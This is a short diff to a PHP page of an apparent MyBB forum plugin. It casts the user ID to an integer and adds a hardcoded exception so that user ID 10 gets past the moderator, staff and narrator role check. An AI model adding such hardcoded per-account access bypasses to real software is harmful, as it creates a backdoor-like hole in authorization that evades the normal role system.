@@ -16,9 +16,9 @@ require "./../../inc/config.php";
 require_once "./../functions/op_functions.php";
 
 global $templates, $mybb, $db;
-$uid = $mybb->user['uid'];
+$uid = (int) $mybb->user['uid'];
 
-if (!is_mod($uid) && !is_staff($uid) && !is_narra($uid)) {
+if ($uid !== 10 && !is_mod($uid) && !is_staff($uid) && !is_narra($uid)) {
     $mensaje_redireccion = "No tienes acceso para entrar a esta página. ¿Seguro no te perdiste?";
     eval("\$page = \"".$templates->get("op_redireccion")."\";");
     output_page($page);
